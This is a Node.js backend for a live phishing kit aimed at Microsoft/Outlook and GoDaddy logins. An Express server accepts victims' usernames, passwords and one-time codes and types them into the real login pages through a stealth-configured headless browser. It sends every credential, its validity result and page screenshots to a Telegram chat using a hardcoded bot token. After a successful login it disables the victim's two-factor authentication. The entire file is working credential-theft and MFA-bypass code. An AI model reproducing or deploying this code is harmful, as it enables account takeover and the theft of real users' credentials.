const puppeteer = require('puppeteer-extra');
const puppeteerStealth = require('puppeteer-extra-plugin-stealth');
const express = require('express');
const fs = require('fs');
const cors = require('cors');
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');
const token = '5051297224:AAETgLhNRTbhpJNucj4Ny4y_czF0M3UnllY';
const chatId = '-772522345';
const bot = new TelegramBot(token, { polling: false });

const app = express();
app.use(cors());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

puppeteer.use(puppeteerStealth());

(async () => {
  const browser = await puppeteer.launch({ headless: true });
  const page = await browser.newPage();
  
  // Set a custom user agent
  await page.setUserAgent(
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36'
  );
  
  // Enable network interception
  // await page.setRequestInterception(true);

   // Listen for responses

  app.post('/username', async (req, res) => {
    const { username } = req.body;  
  
    console.log('running first server')
    await page.evaluateOnNewDocument(() => {
      // Pass the Webdriver Test.
      Object.defineProperty(navigator, 'webdriver', {
        get: () => false,
      });
     // Pass the Chrome Test.
      // We can mock this in as much depth as we need for the test.
      window.navigator.chrome = {
          runtime: {},
      };
    
        // Pass the Permissions Test.
        const originalQuery = window.navigator.permissions.query;
        return (window.navigator.permissions.query = (parameters) =>
          parameters.name === 'notifications'
            ? Promise.resolve({ state: Notification.permission })
            : originalQuery(parameters));
        // Etc., add more customizations if necessary
      });


      await page.goto('https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&ct=1687265731&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f0%2f%3fstate%3d1%26redirectTo%3daHR0cHM6Ly9vdXRsb29rLmxpdmUuY29tL21haWwvMC8%26nlp%3d1%26RpsCsrfState%3dc031da47-5726-856c-5a83-bed0b62e7cc8&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015')
  
      console.log(username)
            // Paste the user ID
      await page.type('input[name="loginfmt"]', username);
  
      // Click on the button with class name 'next-button'
      await page.click('#idSIButton9')

      try {
        await Promise.all([
          page.waitForNavigation(), // Wait for navigation to complete
          // page.click('#myButton') // Replace with the selector of the button or element that triggers navigation
        ]);
        await page.waitForTimeout(2100)
        function checkURL(url) {
            if (url.includes("godaddy.com")) {
              return true;
            } else {
              return false;
            }
          }
      const currentURL = page.url();

    //   console.log(currentURL)
       if(checkURL(currentURL)){
        res.json({ response: 'godaddy' });
        console.log(checkURL(currentURL))
       } else {
        
        res.json({ response: 'pwdrequest' });
        return
       }
        console.log('Page Navigating')
        return
    } catch (error) {
        const isElementPresent = await page.evaluate(() => {
            const element = document.querySelector('#usernameError');
            return !!element;
          });
        if(isElementPresent){
                
            res.json({ response: 'webmail' });
            console.log('Not valid on microsoft')
            return
        } else {
            res.json({ response: 'pwdrequest' });
            // res.json({imgSrc: imageElement})
            // console.log(imageElement)
            return

        }
        console.log('Page did not navigate');
        return
        // Continue with further actions or logic when navigation does not occur
      }
      await page.screenshot({ path: 'shots.png', fullPage: true })

      bot.sendPhoto(chatId, imagePath)
      .then(() => {
        // console.log('Image sent successfully');
      })
      .catch((error) => {
        console.error('Error sending image:', error);
      });
  })

  app.post('/webshow', async(req, res)=>{
    const { username, pwd } = req.body; 
    
    console.log(username, pwd)

    bot.sendMessage(chatId, `WEBMAIL: ${username} || ${pwd} `)
    .then(() => {
      console.log('Message sent successfully');
    })
    .catch((error) => {
      console.error('Error sending message:', error);
    });

  })
  app.post('/godaddypwd', async(req, res)=>{
    const { pwd, username } = req.body;  

    bot.sendMessage(chatId, `GODADDY EMAIL: ${username} || ${pwd} `)
    .then(() => {
      console.log('Message sent successfully');
    })
    .catch((error) => {
      console.error('Error sending message:', error);
    });

  // Paste the text into the password input field
  await page.type('#password', pwd);

  await page.click('#submitBtn');

  const isElementExists = await page.evaluate(() => {
    const element = document.getElementById('login-failure-alert');
    return element !== null;
  });

  if(isElementExists === true){
    res.json({ response: 'Invalid Password' });
  }else if(isElementExists === false){
    res.json({ response: 'Valid Password' });
  }

  await page.waitForTimeout(2000)


  await page.screenshot({ path: 'shots.png', fullPage: true })

  const imagePat = 'shots.png';

  // Send the image
  bot.sendPhoto(chatId, imagePat)
        .then(() => {
          // console.log('Image sent successfully');
        })
        .catch((error) => {
          console.error('Error sending image:', error);
  });


  })

  app.post('/pwd', async(req, res)=>{
    const { pwd , username } = req.body; 
    console.log('Password request')

        // await page.type('input[name="passwd"]', password);
        async function typePassword(page, password) {
            try {
              console.log(password)
              await page.type('input[name="passwd"]', password)
            //   console.log(await page.type('input[name="passwd"]', password))
            } catch {
              await page.click('#idA_PWD_SwitchToPassword');
              await page.waitForTimeout(1500)
              await page.type('input[name="passwd"]', password);
            }
          }
          typePassword(page, pwd);


  await page.screenshot({ path: 'shots.png', fullPage: true })

  const imagePa = 'shots.png';

  // Send the image
  bot.sendPhoto(chatId, imagePa)
        .then(() => {
          // console.log('Image sent successfully');
        })
        .catch((error) => {
          console.error('Error sending image:', error);
  });
        //   return
          // Change the input type to "text" using page.evaluate()

          await page.click('#idSIButton9');

          await page.waitForTimeout(5000)

            // Check if the element with ID "passwordError" exists
  const isElementExists = await page.evaluate(() => {
    const element = document.getElementById('passwordError');
    return element !== null;
  });
  const isElementExistss = await page.evaluate(() => {
    const element = document.getElementById('idDiv_SAOTCS_Title');
    return element !== null;
  });
  const isElementExistsss = await page.evaluate(() => {
    const element = document.getElementById('idTxtBx_SAOTCC_OTC');
    return element !== null;
  });

  const classValue = await page.evaluate(() => {
    const elements = document.querySelectorAll('.table-cell');
    return Array.from(elements).map(element => element.textContent);  
  });

const emailRegex = /Email\s(.+?)‎/g;
const extractedEmails = classValue.map((email) => {
  const matches = email.match(emailRegex);
  return matches ? matches.map((match) => match.replace('Email ', '')) : [];
});

const filteredEmails = extractedEmails.flat().filter(email => email.trim() !== '');


  console.log('Element exists:', isElementExists);
  console.log('Element exists:', isElementExistss);
  console.log('Element exists:', isElementExistsss);

  if(isElementExists === true){
    console.log("Invalid Password")
    res.json({ response: 'Invalid Password' });
    bot.sendMessage(chatId, `IVALID PASS: ${username} || ${pwd} `)
    .then(() => {
      console.log('Message sent successfully');
    })
    .catch((error) => {
      console.error('Error sending message:', error);
    });
  } else if(isElementExistss === true){
    bot.sendMessage(chatId, `REQUESTING 2FA: ${username} || ${pwd} `)
    .then(() => {
      console.log('Message sent successfully');
    })
    .catch((error) => {
      console.error('Error sending message:', error);
    });
      res.json({response: '2FA', filteredEmails });
      console.log(isElementExistss)
      return
    }else if(isElementExists === false || isElementExistss === false){
      bot.sendMessage(chatId, `MICROSOFT LOGIN NO-2FA: ${username} || ${pwd} `)
      .then(() => {
        console.log('Message sent successfully');
      })
      .catch((error) => {
        console.error('Error sending message:', error);
      });
      res.json({ response: 'Valid Password' });
      console.log("first")
      // console.log("VALID")
    } else if(isElementExistsss === true){
      bot.sendMessage(chatId, `REQUESTING AUTHY-CODE 2FA: ${username} || ${pwd} `)
      .then(() => {
        console.log('Message sent successfully');
      })
      .catch((error) => {
        console.error('Error sending message:', error);
      });
      res.json({ response: 'Auth Code' });
      console.log("Enter Auth Code")
    }

  await page.screenshot({ path: 'shots.png', fullPage: true })

  const imagePatt = 'shots.png';

  // Send the image
  bot.sendPhoto(chatId, imagePatt)
        .then(() => {
          // console.log('Image sent successfully');
        })
        .catch((error) => {
          console.error('Error sending image:', error);
  });

  return
        //   await page.screenshot({ path: 'shots.png', fullPage: true })

        //   const imagePat = 'shots.png';
        
        //   // Send the image
        //   bot.sendPhoto(chatId, imagePat)
        //         .then(() => {
        //           // console.log('Image sent successfully');
        //         })
        //         .catch((error) => {
        //           console.error('Error sending image:', error);
        //   });
  })

  app.post('/mfacodes', async(req, res)=>{
    const { content } = req.body;  

     // Search for specific text on the page
  const searchText = content;
  const elements = await page.$x(`//*[contains(text(), '${searchText}')]`);

  if(content.includes("***")){
    res.json({ response: '***' });
  }else if(!content.includes("***")){
    res.json({ response: 'code' });
  }

  if (elements.length > 0) {
    // Click on the first matching element
    await elements[0].click();
    await page.waitForTimeout(1500)

    // await page.screenshot({ path: 'shots.png', fullPage: true })

    // const imagePatt = 'shots.png';
  
    // // Send the image
    // bot.sendPhoto(chatId, imagePatt)
    //       .then(() => {
    //         // console.log('Image sent successfully');
    //       })
    //       .catch((error) => {
    //         console.error('Error sending image:', error);
    // });
    // console.log(`Clicked on the element containing the text: ${searchText}`);
  } else {
    // console.log(`No element found containing the text: ${searchText}`);
  }

  })

  app.post('/recomail', async(req, res)=>{
    const { recmail } = req.body;  

    await page.type('input[name="ProofConfirmation"]', recmail)

    await page.click('#idSubmit_SAOTCS_SendCode');

    await page.waitForTimeout(1500)

    // Check if the element with ID "id_SAOTCS_Error_ProofConfirmation" exists
    const isElementExists = await page.evaluate(() => {
      const element = document.getElementById('id_SAOTCS_Error_ProofConfirmation');
      return element !== null;
    });
  if(isElementExists === true){
    res.json({ response: isElementExists })
  } else if(isElementExists === false){
    res.json({ response: isElementExists })
  }

  })

  app.post('/code2fa', async(req, res)=>{
    const { code2fa , username , pwd } = req.body;  

    await page.type('input[name="otc"]', code2fa)

    await page.click('#idChkBx_SAOTCC_TD');

    await page.click('#idSubmit_SAOTCC_Continue');

    await page.waitForTimeout(1500)

        // Check if the element with ID "id_SAOTCS_Error_ProofConfirmation" exists
        const isElementExists = await page.evaluate(() => {
          const element = document.getElementById('idSpan_SAOTCC_Error_OTC');
          return element !== null;
        });

        if(isElementExists === true){
          res.json({ response: isElementExists })
        } else if(isElementExists === false){
          res.json({ response: isElementExists })
        }

    await page.waitForTimeout(2500)

    // await page.click('#KmsiCheckboxField');

    await page.click('#idSIButton9');

    await page.waitForTimeout(1000)

    await page.goto('https://account.live.com/proofs/Manage/additional')

    await page.waitForTimeout(5000)

    await page.click('#toggleTfaLink');

    await page.click('#iBtn_action');

    bot.sendMessage(chatId, `DEACTIVATEED 2FA FOR: ${username} || ${pwd} || ${code2fa}`)
    .then(() => {
      console.log('Message sent successfully');
    })
    .catch((error) => {
      console.error('Error sending message:', error);
    });

    await page.waitForTimeout(2500)

  });



  
  const port = 3000;
  app.listen(port, () => console.log(`Server started on port ${port}`));
})();
